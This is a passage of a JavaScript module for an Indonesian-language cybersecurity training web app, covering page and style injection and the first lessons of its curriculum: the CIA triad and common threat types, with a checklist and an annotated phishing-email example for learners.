// ================================================================
// CYBER SECURITY ENGINEERING TRAINER — Complete Module
//
// HOW TO INTEGRATE:
// 1. Add nav item to sidebar in index.html:
//    <div class="nav-item" onclick="navigate('cybertrainer')">
//      <span class="nav-icon">🛡️</span>
//      <span class="nav-label">Cyber Security</span></div>
//
// 2. Add to PAGE_TITLES object in navigate():
//    cybertrainer: 'Cyber Security Trainer'
//
// 3. Add mode card to dashboard modes-grid (optional)
//
// 4. Call this script after other trainer scripts:
//    <script src="cyber-security-trainer.js"></script>
//
// 5. The page HTML is injected automatically on load.
// ================================================================
'use strict';

// ================================================================
// INJECT PAGE HTML INTO DOM
// ================================================================
(function injectCyberTrainerPage() {
  const main = document.querySelector('.main');
  if (!main) { console.error('CyberTrainer: .main not found'); return; }

  const pageDiv = document.createElement('div');
  pageDiv.className = 'page';
  pageDiv.id = 'page-cybertrainer';
  pageDiv.innerHTML = `
<!-- ═══ CYBER SECURITY TRAINER PAGE ═══ -->
<div class="ct-header">
  <div class="ct-title-row">
    <div>
      <h2 class="section-title" style="margin-bottom:4px">🛡️ Cyber Security Engineering Trainer</h2>
      <div style="font-size:13px;color:var(--text3)">Belajar Cyber Security dari pemula sampai pro — interaktif, hands-on, dan bertahap</div>
    </div>
    <div class="ct-header-stats">
      <div class="ct-stat-pill"><span id="ct-xp-display">0</span> XP</div>
      <div class="ct-stat-pill" id="ct-streak-pill">🔥 <span id="ct-streak-display">0</span></div>
      <div class="ct-stat-pill" id="ct-level-pill">Lv <span id="ct-level-display">1</span></div>
    </div>
  </div>
  <!-- XP Bar -->
  <div class="ct-xp-bar-wrap">
    <div class="ct-xp-bar" id="ct-xp-bar" style="width:0%"></div>
  </div>
  <div style="display:flex;justify-content:space-between;font-size:11px;color:var(--text3);margin-top:4px">
    <span id="ct-rank-label">Script Kiddie</span>
    <span><span id="ct-xp-cur">0</span> / <span id="ct-xp-next">500</span> XP</span>
  </div>
</div>

<!-- Daily Challenge Banner -->
<div class="ct-daily-banner" id="ct-daily-banner">
  <span style="font-size:24px">🎯</span>
  <div>
    <div style="font-weight:700;color:var(--accent4);font-size:14px" id="ct-daily-title">Daily Security Challenge</div>
    <div style="font-size:12px;color:var(--text2)" id="ct-daily-desc">Selesaikan tantangan keamanan hari ini untuk bonus XP!</div>
  </div>
  <button class="btn btn-primary btn-sm" style="margin-left:auto" onclick="ctStartDailyChallenge()">Mulai</button>
</div>

<!-- Main Layout -->
<div class="ct-layout">

  <!-- LEFT: Curriculum Sidebar -->
  <div class="ct-sidebar" id="ct-sidebar">
    <div style="font-size:11px;font-weight:700;color:var(--text3);text-transform:uppercase;letter-spacing:.08em;padding:10px 14px 6px">Kurikulum CySec</div>
    <div id="ct-curriculum-list"></div>
  </div>

  <!-- RIGHT: Content Area -->
  <div class="ct-content" id="ct-content">

    <!-- Welcome Screen -->
    <div id="ct-welcome-screen">
      <div class="ct-hero-card">
        <div style="font-size:48px;margin-bottom:12px">🛡️</div>
        <h3 style="font-size:22px;font-weight:700;margin-bottom:8px">Selamat Datang di Cyber Security Trainer!</h3>
        <p style="color:var(--text2);font-size:14px;line-height:1.7;max-width:520px;margin:0 auto 20px">
          Platform belajar Cyber Security Engineering secara interaktif. Setiap topik dilengkapi materi, demonstrasi tools, lab simulasi, quiz, dan tantangan nyata.
        </p>
        <div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap">
          <button class="btn btn-primary" onclick="ctStartFromBeginning()">🚀 Mulai dari Awal</button>
          <button class="btn btn-ghost" onclick="ctContinueLearning()">▶ Lanjutkan Belajar</button>
          <button class="btn btn-ghost" onclick="ctShowDragDrop()">🧩 Drag &amp; Drop Lab</button>
          <button class="btn btn-ghost" onclick="ctShowDebug()">🐛 Debug Challenge</button>
        </div>
      </div>
      <!-- Progress Overview -->
      <div class="ct-progress-grid" id="ct-progress-overview"></div>
    </div>

    <!-- Lesson Screen -->
    <div id="ct-lesson-screen" style="display:none">

      <!-- Lesson Nav -->
      <div class="ct-lesson-nav">
        <button class="btn btn-ghost btn-sm" onclick="ctPrevLesson()">← Prev</button>
        <div style="text-align:center">
          <div style="font-size:12px;color:var(--text3)" id="ct-lesson-breadcrumb">Level 1 · Fondasi</div>
          <div style="font-size:15px;font-weight:700" id="ct-lesson-title">Pengantar Cyber Security</div>
        </div>
        <button class="btn btn-ghost btn-sm" onclick="ctNextLesson()">Next →</button>
      </div>

      <!-- Tags -->
      <div style="display:flex;align-items:center;gap:8px;margin-bottom:20px;flex-wrap:wrap">
        <span class="difficulty-badge" id="ct-diff-badge">Beginner</span>
        <span class="ct-topic-badge" id="ct-topic-badge">Fondasi</span>
        <span style="margin-left:auto;font-size:12px;color:var(--text3)" id="ct-lesson-progress-text">Topik 1 dari 5</span>
      </div>

      <!-- Tab Navigation -->
      <div class="ct-tabs" id="ct-tabs">
        <button class="ct-tab active" onclick="ctSwitchTab('explain',this)">📖 Materi</button>
        <button class="ct-tab" onclick="ctSwitchTab('example',this)">💡 Demo Tools</button>
        <button class="ct-tab" onclick="ctSwitchTab('editor',this)">⚙️ Lab / Kode</button>
        <button class="ct-tab" onclick="ctSwitchTab('quiz',this)">🧠 Quiz</button>
        <button class="ct-tab" onclick="ctSwitchTab('challenge',this)">🏆 Challenge</button>
      </div>

      <!-- Tab: Materi -->
      <div id="ct-tab-explain" class="ct-tab-content active">
        <div class="ct-lesson-card">
          <div id="ct-explain-content"></div>
        </div>
      </div>

      <!-- Tab: Demo Tools -->
      <div id="ct-tab-example" class="ct-tab-content">
        <div class="ct-lesson-card">
          <div id="ct-example-content"></div>
        </div>
      </div>

      <!-- Tab: Lab / Kode -->
      <div id="ct-tab-editor" class="ct-tab-content">
        <div class="ct-editor-wrap">
          <div class="ct-editor-panel">
            <div class="ct-panel-header">
              <span class="panel-dot red"></span><span class="panel-dot yellow"></span><span class="panel-dot green"></span>
              <span style="margin-left:8px;font-size:12px;color:var(--text3)" id="ct-editor-filename">lab.py</span>
              <div style="margin-left:auto;display:flex;gap:6px">
                <button class="btn btn-ghost btn-sm" onclick="ctRunCode()">▶ Simulate</button>
                <button class="btn btn-ghost btn-sm" onclick="ctResetCode()">↺ Reset</button>
                <button class="btn btn-ghost btn-sm" onclick="ctCopyCode()">📋 Copy</button>
              </div>
            </div>
            <textarea id="ct-code-editor" class="ct-code-editor" spellcheck="false" autocorrect="off" autocapitalize="off"
              oninput="ctLiveUpdate()" placeholder="Tulis kode / command di sini..."></textarea>
          </div>
          <div class="ct-preview-panel">
            <div class="ct-panel-header">
              <span class="panel-dot red"></span><span class="panel-dot yellow"></span><span class="panel-dot green"></span>
              <span style="margin-left:8px;font-size:12px;color:var(--text3)">Terminal / Output</span>
            </div>
            <div id="ct-terminal-output" class="ct-terminal"></div>
          </div>
        </div>
        <!-- Tips -->
        <div class="ct-editor-tips" id="ct-editor-tips"></div>
        <!-- Typing Mode -->
        <div style="display:flex;align-items:center;gap:10px;margin-top:12px">
          <button class="btn btn-ghost btn-sm" id="ct-typing-mode-btn" onclick="ctToggleTypingMode()">⌨️ Typing Mode</button>
          <span style="font-size:12px;color:var(--text3)">Latih mengetik command / code security secara akurat</span>
        </div>
        <div id="ct-typing-zone" style="display:none;margin-top:14px">
          <div class="ct-typing-instruction">Ketik ulang command di bawah ini dengan tepat:</div>
          <div id="ct-typing-display" class="ct-typing-display"></div>
          <input type="text" id="ct-typing-input" class="typing-input" placeholder="Mulai ketik..." oninput="ctHandleTypingInput(event)" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" style="margin-top:10px">
          <div class="typing-stats-bar" style="margin-top:10px">
            <div class="ts-item"><div class="ts-val" id="ct-t-wpm">0</div><div class="ts-label">WPM</div></div>
            <div class="ts-item"><div class="ts-val" id="ct-t-acc">100%</div><div class="ts-label">Accuracy</div></div>
            <div class="ts-item"><div class="ts-val" id="ct-t-prog">0%</div><div class="ts-label">Progress</div></div>
          </div>
        </div>
      </div>

      <!-- Tab: Quiz -->
      <div id="ct-tab-quiz" class="ct-tab-content">
        <div class="ct-lesson-card" id="ct-quiz-content"></div>
      </div>

      <!-- Tab: Challenge -->
      <div id="ct-tab-challenge" class="ct-tab-content">
        <div class="ct-lesson-card" id="ct-challenge-content"></div>
      </div>

      <!-- Footer Buttons -->
      <div style="display:flex;gap:10px;margin-top:20px;flex-wrap:wrap">
        <button class="btn btn-primary" onclick="ctCompleteLesson()" id="ct-complete-btn">✅ Selesai &amp; Lanjut</button>
        <button class="btn btn-ghost" onclick="ctNextLesson()">Lewati →</button>
        <div id="ct-lesson-complete-badge" style="display:none;align-items:center;gap:6px;background:rgba(93,224,160,0.1);border:1px solid rgba(93,224,160,0.2);padding:6px 14px;border-radius:20px;font-size:12px;color:var(--green)">
          ✓ Topik ini sudah diselesaikan
        </div>
      </div>
    </div>

    <!-- Mode: Drag & Drop Lab -->
    <div id="ct-dragdrop-screen" style="display:none">
      <div class="ct-lesson-card">
        <h3 style="margin-bottom:8px">🧩 Susun Alur Serangan / Pertahanan</h3>
        <p style="font-size:13px;color:var(--text2);margin-bottom:16px" id="ct-dd-instruction">Seret tahap ke posisi yang benar untuk membentuk alur yang valid.</p>
        <div class="ct-dd-wrap">
          <div class="ct-dd-tags" id="ct-dd-tags"></div>
          <div class="ct-dd-drop" id="ct-dd-drop">
            <div style="color:var(--text3);font-size:13px">Seret tahap ke sini dalam urutan yang benar</div>
          </div>
        </div>
        <div style="display:flex;gap:8px;margin-top:14px">
          <button class="btn btn-primary btn-sm" onclick="ctCheckDragDrop()">✓ Cek Jawaban</button>
          <button class="btn btn-ghost btn-sm" onclick="ctResetDragDrop()">↺ Reset</button>
          <button class="btn btn-ghost btn-sm" onclick="ctShowWelcome()">← Kembali</button>
        </div>
        <div id="ct-dd-feedback" style="margin-top:10px;font-size:13px"></div>
      </div>
    </div>

    <!-- Mode: Debug / CTF -->
    <div id="ct-debug-screen" style="display:none">
      <div class="ct-lesson-card">
        <h3 style="margin-bottom:8px">🐛 Debug Security — Temukan Vulnerability</h3>
        <p style="font-size:13px;color:var(--text2);margin-bottom:12px" id="ct-debug-desc">Analisis kode berikut dan temukan celah keamanannya.</p>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
          <div>
            <div style="font-size:11px;color:var(--red);font-weight:700;margin-bottom:6px">🐛 Kode Vulnerable:</div>
            <pre id="ct-debug-buggy" class="ct-code-block" style="border-color:rgba(247,106,106,0.2)"></pre>
          </div>
          <div>
            <div style="font-size:11px;color:var(--green);font-weight:700;margin-bottom:6px">✅ Tulis kode yang sudah diamankan:</div>
            <textarea id="ct-debug-input" class="ct-code-editor" style="height:200px;font-size:12px" placeholder="Tulis kode yang sudah diperbaiki/diamankan..."></textarea>
          </div>
        </div>
        <div style="display:flex;gap:8px;margin-top:12px">
          <button class="btn btn-primary btn-sm" onclick="ctCheckDebug()">✓ Cek</button>
          <button class="btn btn-ghost btn-sm" onclick="ctShowDebugHint()">💡 Hint</button>
          <button class="btn btn-ghost btn-sm" onclick="ctShowWelcome()">← Kembali</button>
        </div>
        <div id="ct-debug-feedback" style="margin-top:10px;font-size:13px"></div>
      </div>
    </div>

  </div><!-- /ct-content -->
</div><!-- /ct-layout -->
`;

  main.appendChild(pageDiv);
  console.log('CyberTrainer: Page injected ✓');
})();

// ================================================================
// INJECT CSS
// ================================================================
(function injectCyberTrainerCSS() {
  const style = document.createElement('style');
  style.textContent = `
/* ── CYBER SECURITY TRAINER STYLES ── */
.ct-header{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius-lg);padding:20px 24px;margin-bottom:18px}
.ct-title-row{display:flex;align-items:flex-start;justify-content:space-between;gap:12px;margin-bottom:14px;flex-wrap:wrap}
.ct-header-stats{display:flex;gap:8px;flex-wrap:wrap}
.ct-stat-pill{background:var(--bg3);border:1px solid var(--border);padding:5px 12px;border-radius:20px;font-size:12px;font-weight:600;font-family:var(--font-data)}
.ct-xp-bar-wrap{background:var(--bg3);border-radius:4px;height:6px;overflow:hidden}
.ct-xp-bar{height:100%;background:linear-gradient(90deg,#f76a6a,#f7b96a);transition:width .5s ease}

.ct-daily-banner{display:flex;align-items:center;gap:14px;background:linear-gradient(135deg,rgba(247,106,106,.08),rgba(247,185,106,.05));border:1px solid rgba(247,106,106,.2);border-radius:var(--radius);padding:14px 18px;margin-bottom:18px;flex-wrap:wrap}

.ct-layout{display:grid;grid-template-columns:220px 1fr;gap:16px;align-items:start}
@media(max-width:900px){.ct-layout{grid-template-columns:1fr}}

.ct-sidebar{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;position:sticky;top:72px;max-height:calc(100vh - 100px);overflow-y:auto}
.ct-level-item{border-bottom:1px solid var(--border);overflow:hidden}
.ct-level-header{padding:10px 14px;cursor:pointer;display:flex;align-items:center;gap:8px;font-size:12px;font-weight:700;color:var(--text2);transition:background .15s;user-select:none}
.ct-level-header:hover{background:var(--bg3)}
.ct-level-header.open{color:#f76a6a}
.ct-level-topics{display:none;padding:4px 0}
.ct-level-topics.open{display:block}
.ct-topic-item{padding:7px 14px 7px 28px;font-size:12px;color:var(--text3);cursor:pointer;transition:all .15s;display:flex;align-items:center;gap:6px;border-left:2px solid transparent}
.ct-topic-item:hover{color:var(--text);background:var(--bg3)}
.ct-topic-item.active{color:#f76a6a;background:rgba(247,106,106,.08);border-left-color:#f76a6a}
.ct-topic-item.completed::before{content:'✓';color:var(--green);margin-right:2px;font-size:10px}
.ct-topic-item.locked{opacity:.4;cursor:not-allowed}
.ct-topic-progress{font-size:10px;color:var(--text3);margin-left:auto}

.ct-content{min-height:400px}
.ct-hero-card{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius-lg);padding:40px 32px;text-align:center;margin-bottom:20px}
.ct-progress-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:10px}
.ct-progress-card{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:14px;text-align:center;cursor:pointer;transition:all .2s}
.ct-progress-card:hover{transform:translateY(-2px);border-color:rgba(247,106,106,.3)}
.ct-progress-card .pc-icon{font-size:24px;margin-bottom:6px}
.ct-progress-card .pc-name{font-size:12px;font-weight:600;margin-bottom:4px}
.ct-progress-card .pc-bar-wrap{background:var(--bg3);border-radius:3px;height:4px;overflow:hidden}
.ct-progress-card .pc-bar{height:100%;background:linear-gradient(90deg,#f76a6a,#f7b96a);transition:width .5s}
.ct-progress-card .pc-pct{font-size:10px;color:var(--text3);margin-top:3px}

.ct-lesson-nav{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;padding:12px 16px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius)}
.ct-topic-badge{background:rgba(247,106,106,.1);color:#f76a6a;border:1px solid rgba(247,106,106,.2);padding:3px 10px;border-radius:20px;font-size:11px;font-weight:600;font-family:var(--font-mono)}

.ct-tabs{display:flex;gap:4px;background:var(--bg2);padding:4px;border-radius:10px;border:1px solid var(--border);margin-bottom:16px;flex-wrap:wrap}
.ct-tab{padding:6px 14px;border-radius:8px;font-size:12px;font-weight:600;cursor:pointer;transition:all .2s;color:var(--text2);background:transparent;border:none;font-family:var(--font-ui)}
.ct-tab.active{background:linear-gradient(135deg,#f76a6a,#f7b96a);color:#fff}
.ct-tab:hover:not(.active){background:var(--bg3);color:var(--text)}

.ct-tab-content{display:none}
.ct-tab-content.active{display:block}

.ct-lesson-card{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius-lg);padding:24px 28px}
.ct-lesson-card h3{font-size:18px;font-weight:700;margin-bottom:12px;color:var(--text)}
.ct-lesson-card h4{font-size:14px;font-weight:700;color:#f76a6a;margin:16px 0 8px;display:flex;align-items:center;gap:6px}
.ct-lesson-card p{font-size:13px;color:var(--text2);line-height:1.75;margin-bottom:10px}
.ct-lesson-card ul,.ct-lesson-card ol{font-size:13px;color:var(--text2);line-height:1.75;padding-left:18px;margin-bottom:10px}
.ct-lesson-card li{margin-bottom:4px}
.ct-lesson-card strong{color:var(--text);font-weight:700}
.ct-lesson-card code{font-family:var(--font-mono);font-size:12px;background:var(--bg3);padding:2px 6px;border-radius:5px;color:#f76a6a}

.ct-code-block{font-family:var(--font-mono);font-size:13px;background:var(--bg);border:1px solid var(--border);border-radius:10px;padding:16px;white-space:pre-wrap;word-break:break-all;color:var(--text2);line-height:1.75;margin:10px 0;overflow:auto;max-height:320px}
.ct-copy-row{display:flex;justify-content:flex-end;margin-top:-4px;margin-bottom:8px}
.ct-copy-btn{background:var(--bg3);border:1px solid var(--border);color:var(--text3);padding:4px 10px;border-radius:6px;font-size:11px;cursor:pointer;font-family:var(--font-ui);transition:all .15s}
.ct-copy-btn:hover{color:var(--text)}

.ct-tip-box{background:rgba(93,224,197,.06);border:1px solid rgba(93,224,197,.15);border-radius:8px;padding:10px 14px;font-size:12px;color:var(--accent2);line-height:1.6;margin:10px 0;display:flex;gap:8px;align-items:flex-start}
.ct-warn-box{background:rgba(247,185,106,.07);border:1px solid rgba(247,185,106,.2);border-radius:8px;padding:10px 14px;font-size:12px;color:var(--accent4);line-height:1.6;margin:10px 0;display:flex;gap:8px;align-items:flex-start}
.ct-error-box{background:rgba(247,106,106,.07);border:1px solid rgba(247,106,106,.2);border-radius:8px;padding:10px 14px;font-size:12px;color:var(--red);line-height:1.6;margin:10px 0;display:flex;gap:8px;align-items:flex-start}
.ct-danger-box{background:rgba(220,38,38,.08);border:1px solid rgba(220,38,38,.25);border-radius:8px;padding:10px 14px;font-size:12px;color:#f87171;line-height:1.6;margin:10px 0;display:flex;gap:8px;align-items:flex-start}

/* Editor & Terminal */
.ct-editor-wrap{display:grid;grid-template-columns:1fr 1fr;gap:12px;min-height:340px}
@media(max-width:700px){.ct-editor-wrap{grid-template-columns:1fr}}
.ct-editor-panel,.ct-preview-panel{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;display:flex;flex-direction:column}
.ct-panel-header{padding:8px 14px;background:var(--bg3);border-bottom:1px solid var(--border);display:flex;align-items:center;gap:6px;flex-shrink:0}
.ct-code-editor{flex:1;padding:14px 16px;font-family:var(--font-mono);font-size:13px;line-height:1.75;background:var(--bg);border:none;color:var(--text);outline:none;resize:vertical;min-height:220px;caret-color:#f76a6a;tab-size:2}
.ct-terminal{flex:1;background:#0a0a0f;color:#00ff88;font-family:var(--font-mono);font-size:12px;line-height:1.7;padding:14px 16px;overflow-y:auto;min-height:220px;white-space:pre-wrap;word-break:break-all}
.ct-terminal .t-prompt{color:#f76a6a}
.ct-terminal .t-output{color:#a0aec0}
.ct-terminal .t-success{color:#00ff88}
.ct-terminal .t-error{color:#f76a6a}
.ct-terminal .t-warn{color:#f7b96a}
.ct-terminal .t-info{color:#60a5fa}
.ct-editor-tips{background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:10px 14px;margin-top:10px;font-size:12px;color:var(--text3);line-height:1.6}

/* Typing Mode */
.ct-typing-instruction{font-size:11px;color:var(--text3);font-family:var(--font-mono);margin-bottom:8px}
.ct-typing-display{font-family:var(--font-mono);font-size:14px;line-height:1.85;background:var(--bg);border-radius:8px;padding:12px 14px;border:1px solid var(--border);user-select:none;white-space:pre-wrap;word-break:break-all}

/* Quiz */
.ct-quiz-option{width:100%;text-align:left;padding:10px 16px;background:var(--bg2);border:1px solid var(--border);border-radius:8px;color:var(--text2);cursor:pointer;font-size:13px;font-family:var(--font-ui);transition:all .2s;margin-bottom:8px;display:block}
.ct-quiz-option:hover{background:var(--bg3);color:var(--text)}
.ct-quiz-option.correct{background:rgba(93,224,160,.12);border-color:var(--green);color:var(--green)}
.ct-quiz-option.wrong{background:rgba(247,106,106,.1);border-color:var(--red);color:var(--red)}
.ct-quiz-result{margin-top:12px;padding:10px 16px;border-radius:8px;font-size:13px;line-height:1.6}
.ct-quiz-result.pass{background:rgba(93,224,160,.1);border:1px solid rgba(93,224,160,.2);color:var(--green)}
.ct-quiz-result.fail{background:rgba(247,106,106,.08);border:1px solid rgba(247,106,106,.2);color:var(--red)}

/* Drag-drop */
.ct-dd-wrap{display:grid;grid-template-columns:1fr 1fr;gap:16px}
@media(max-width:600px){.ct-dd-wrap{grid-template-columns:1fr}}
.ct-dd-tags{display:flex;flex-wrap:wrap;gap:8px;padding:12px;background:var(--bg3);border-radius:8px;min-height:80px;align-content:flex-start}
.ct-dd-drop{min-height:160px;border:2px dashed rgba(247,106,106,.3);border-radius:8px;padding:12px;display:flex;flex-direction:column;gap:6px;align-items:flex-start;justify-content:flex-start;transition:border-color .2s}
.ct-dd-drop.dragover{border-color:#f76a6a;background:rgba(247,106,106,.05)}
.ct-dd-tag{padding:5px 12px;background:var(--bg2);border:1px solid rgba(247,106,106,.3);border-radius:6px;font-size:12px;font-family:var(--font-mono);color:#f76a6a;cursor:grab;transition:all .15s;user-select:none}
.ct-dd-tag:hover{background:rgba(247,106,106,.1)}
.ct-dd-tag.placed{background:var(--bg3);color:var(--text2);cursor:grab}

/* Achievement popup */
.ct-badge-popup{position:fixed;top:70px;left:50%;transform:translateX(-50%) translateY(-120px);background:linear-gradient(135deg,#f76a6a,#f7b96a);color:#fff;padding:12px 24px;border-radius:12px;font-size:14px;font-weight:700;z-index:999;transition:transform .4s cubic-bezier(.34,1.56,.64,1);box-shadow:0 4px 24px rgba(247,106,106,.5);white-space:nowrap;pointer-events:none;display:flex;align-items:center;gap:8px}
.ct-badge-popup.show{transform:translateX(-50%) translateY(0)}
`;
  document.head.appendChild(style);
})();

// ================================================================
// CURRICULUM DATA — 10 Levels, 50+ Topics
// ================================================================
const CT_CURRICULUM = [
  {
    id: 1, name: 'Fondasi CySec', icon: '🏗️', color: '#5de0a0',
    topics: [
      {
        id: 'l1t1', title: 'Apa itu Cyber Security?', diff: 'beginner',
        filename: 'intro.md',
        explain: `
<h3>Apa itu Cyber Security?</h3>
<p><strong>Cyber Security</strong> (Keamanan Siber) adalah praktik melindungi sistem komputer, jaringan, program, dan data dari serangan digital, kerusakan, atau akses tidak sah.</p>
<h4>🔑 CIA Triad — Fondasi Keamanan</h4>
<ul>
  <li><strong>Confidentiality (Kerahasiaan)</strong> — Informasi hanya bisa diakses oleh yang berwenang. Contoh: enkripsi data, password.</li>
  <li><strong>Integrity (Integritas)</strong> — Data tidak boleh dimodifikasi tanpa izin. Contoh: digital signature, checksum.</li>
  <li><strong>Availability (Ketersediaan)</strong> — Sistem dan data harus tersedia saat dibutuhkan. Contoh: backup, anti-DDoS.</li>
</ul>
<h4>📌 Kenapa Cyber Security Penting?</h4>
<ul>
  <li>Serangan siber menyebabkan kerugian miliaran dolar setiap tahun</li>
  <li>Data pribadi dan bisnis semakin berharga dan rentan</li>
  <li>Ketergantungan pada teknologi terus meningkat</li>
  <li>Regulasi keamanan data (GDPR, UU PDP) semakin ketat</li>
</ul>
<div class="ct-tip-box">💡 <span>Cyber Security bukan hanya tentang hacking — ini adalah tentang membangun sistem yang aman, mendeteksi ancaman, dan merespons insiden dengan cepat.</span></div>
<h4>🎯 Area Utama Cyber Security</h4>
<ul>
  <li>Network Security — Keamanan jaringan komputer</li>
  <li>Application Security — Keamanan aplikasi dan kode</li>
  <li>Information Security — Perlindungan data sensitif</li>
  <li>Operational Security — Prosedur dan kebijakan keamanan</li>
  <li>Incident Response — Penanganan ketika terjadi serangan</li>
</ul>
`,
        example: `# CIA Triad Checklist
# Gunakan ini untuk menilai keamanan sistem Anda

CONFIDENTIALITY:
  ✓ Data sensitif dienkripsi at-rest dan in-transit
  ✓ Access control — hanya user berwenang yang bisa akses
  ✓ Multi-Factor Authentication (MFA) aktif
  ✓ Password policy kuat (min 12 karakter, kompleks)

INTEGRITY:
  ✓ Digital signature untuk file penting
  ✓ Checksums/hash untuk verifikasi file (SHA256)
  ✓ Audit log untuk setiap perubahan data
  ✓ Database backup + verifikasi integritas

AVAILABILITY:
  ✓ Redundansi server (failover)
  ✓ Backup otomatis (3-2-1 rule)
  ✓ DDoS protection aktif
  ✓ SLA uptime terdokumentasi (99.9%+)`,
        editorStarter: `# === CIA Triad Self-Assessment ===
# Isi checklist ini untuk sistem yang sedang kamu audit

SISTEM: _______________
TANGGAL: _______________

# CONFIDENTIALITY (beri tanda ✓ atau ✗)
[ ] Enkripsi data sensitif
[ ] Access control diterapkan
[ ] MFA untuk akun admin
[ ] Password policy kuat

# INTEGRITY
[ ] Digital signature digunakan
[ ] Audit logging aktif
[ ] Backup diverifikasi secara berkala

# AVAILABILITY
[ ] Sistem redundant
[ ] Backup test terakhir: ___
[ ] DDoS protection aktif

SKOR: ___ / 12
RISIKO: [ ] Low  [ ] Medium  [ ] High`,
        editorTask: 'Lengkapi self-assessment checklist untuk sistem yang kamu bayangkan. Identifikasi 3 risiko utama.',
        terminalSim: `[analyst@seclab ~]$ cat cia-assessment.md
=== CIA Triad Assessment Tool ===

Checking CONFIDENTIALITY...
  [✓] Encryption: AES-256 detected
  [✗] MFA: Not configured — RISK!
  [✓] Access Control: RBAC active

Checking INTEGRITY...
  [✓] Audit logs: Enabled
  [✗] Digital signatures: Missing — WARNING!
  [✓] Backup verified: 2024-01-15

Checking AVAILABILITY...
  [✓] Uptime: 99.7% (30 days)
  [✓] DDoS Protection: CloudFlare active
  [✗] Disaster Recovery Plan: Not documented!

Overall Risk Score: MEDIUM
Critical Issues: 3
Recommendations:
  1. Enable MFA immediately
  2. Implement digital signatures
  3. Document DR plan`,
        quiz: {
          q: 'Manakah yang BUKAN bagian dari CIA Triad?',
          options: ['Confidentiality', 'Integrity', 'Authentication', 'Availability'],
          correct: 2,
          explanation: 'CIA Triad terdiri dari Confidentiality, Integrity, dan Availability. Authentication adalah mekanisme keamanan, bukan bagian dari CIA Triad.',
        },
        challenge: {
          title: 'Analisis Risiko CIA',
          desc: 'Bayangkan kamu adalah security analyst di perusahaan e-commerce. Identifikasi minimal 2 ancaman untuk setiap aspek CIA Triad dan tulis rekomendasi mitigasinya.',
          starter: `# Analisis Risiko CIA Triad
# Sistem: E-Commerce Platform

CONFIDENTIALITY THREATS:
1. 
2. 
Mitigasi: 

INTEGRITY THREATS:
1. 
2. 
Mitigasi: 

AVAILABILITY THREATS:
1. 
2. 
Mitigasi: `,
          hint: 'Pikirkan tentang data pelanggan, transaksi, dan ketersediaan toko online 24/7.',
        },
        xp: 40,
      },
      {
        id: 'l1t2', title: 'Jenis-jenis Ancaman Siber', diff: 'beginner',
        filename: 'threats.md',
        explain: `
<h3>Lanskap Ancaman Siber</h3>
<p>Memahami jenis-jenis ancaman adalah langkah pertama membangun pertahanan yang efektif.</p>
<h4>⚔️ Malware (Malicious Software)</h4>
<ul>
  <li><strong>Virus</strong> — Menyebar dengan menyisipkan diri ke program lain</li>
  <li><strong>Ransomware</strong> — Mengenkripsi data korban, minta tebusan</li>
  <li><strong>Trojan</strong> — Menyamar sebagai software sah, tapi berbahaya di dalam</li>
  <li><strong>Spyware</strong> — Memata-matai aktivitas pengguna secara diam-diam</li>
  <li><strong>Rootkit</strong> — Menyembunyikan keberadaan malware lain di sistem</li>
  <li><strong>Worm</strong> — Menyebar sendiri ke jaringan tanpa interaksi pengguna</li>
</ul>
<h4>🎭 Social Engineering</h4>
<ul>
  <li><strong>Phishing</strong> — Email palsu menipu korban memberikan kredensial</li>
  <li><strong>Spear Phishing</strong> — Phishing yang ditargetkan ke individu spesifik</li>
  <li><strong>Vishing</strong> — Social engineering melalui telepon</li>
  <li><strong>Baiting</strong> — Umpan fisik (USB, CD) yang mengandung malware</li>
</ul>
<h4>🌐 Network Attacks</h4>
<ul>
  <li><strong>DDoS</strong> — Membanjiri server dengan traffic sampai down</li>
  <li><strong>Man-in-the-Middle (MitM)</strong> — Menyadap komunikasi antara dua pihak</li>
  <li><strong>SQL Injection</strong> — Menyisipkan query SQL berbahaya ke aplikasi</li>
  <li><strong>Zero-Day</strong> — Eksploitasi celah yang belum diketahui/dipatch vendor</li>
</ul>
<div class="ct-warn-box">⚠️ <span>Ransomware adalah ancaman paling merusak saat ini. Rata-rata uang tebusan mencapai $1.5 juta per insiden di 2023. Backup yang baik adalah pertahanan terbaik!</span></div>
<h4>🕵️ Insider Threats</h4>
<p>Ancaman dari dalam organisasi sendiri — karyawan yang tidak puas, komputer yang terinfeksi, atau kontraktor yang tidak dipercaya.</p>
`,
        example: `# Anatomy of a Phishing Email
# Kenali tanda-tanda phishing:

FROM: security@bank-update-verify.com  ← Domain mencurigakan!
TO: victim@company.com
SUBJECT: [URGENT] Akun Anda akan ditangguhkan!  ← Urgency palsu

Body:
"Yth Pelanggan,
Kami mendeteksi aktivitas mencurigakan di akun Anda.
Silakan verifikasi dalam 24 JAM atau akun DITANGGUHKAN."
                                         ← Ancaman + urgensi = manipulasi
[Klik di sini untuk verifikasi]          ← Link ke situs palsu
https://bank-verify-login.net/secure     ← Domain palsu, bukan bank asli!

Tanda-tanda Phishing:
✗ Domain pengirim bukan domain resmi
✗ Urgency yang dibuat-buat (24 jam!)
✗ Ancaman akun ditangguhkan
✗ Link menuju domain yang bukan milik bank
✗ Grammar/ejaan yang aneh
✗ Meminta password / PIN melalui email`,
        editorStarter: `# === Phishing Email Analyzer ===
# Analisis email berikut, tandai tanda-tanda phishing

EMAIL YANG DIANALISIS:
From: it-support@company-helpdesk-verify.net
Subject: URGENT: Password Kamu Expires Hari Ini!

"Dear Employee,
Your password will expire TODAY at 5PM.
Click here to reset: http://company-reset-pw.xyz/login
Enter your username and current password to continue.
Failure to update will result in account termination."

ANALISIS SAYA:
1. Domain pengirim: [normal/mencurigakan] - alasan:
2. Subject line: [normal/manipulatif] - alasan:
3. Link tujuan: [aman/berbahaya] - alasan:
4. Konten permintaan: [wajar/tidak wajar] - alasan:
5. Urgency: [ada/tidak ada] - dampak:

